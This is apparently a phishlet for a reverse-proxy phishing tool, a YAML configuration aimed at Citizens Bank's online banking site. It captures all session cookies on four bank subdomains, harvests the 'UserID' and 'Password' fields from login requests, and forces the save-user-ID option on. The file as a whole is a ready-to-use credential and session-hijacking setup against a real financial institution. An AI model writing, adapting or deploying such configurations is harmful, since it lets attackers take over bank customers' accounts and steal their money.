auth_tokens:
  - domain: '.citizensbankonline.com'
    keys: ['.*,regexp']
  - domain: 'www.citizensbankonline.com'
    keys: ['.*,regexp']
  - domain: 'www3.citizensbankonline.com'
    keys: ['.*,regexp']
  - domain: 'www4.citizensbankonline.com'
    keys: ['.*,regexp']

auth_urls:
  - '/account/*'

credentials:
  username:
    key: 'UserID'
    search: '(.*)'
    type: 'post'

  password:
    key: 'Password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.citizensbankonline.com'
  path: '/efs/servlet/efs/login.jsp'

force_post:
  - path: '/efs/servlet/efs/wait.jsp?target=loginnew-wait.jsp'
    search:
      - { key: 'UserID', search: '.*' }
      - { key: 'Password', search: '.*' }
    force:
      - { key: 'cbSaveUserID', value: 'on' }
    type: 'post'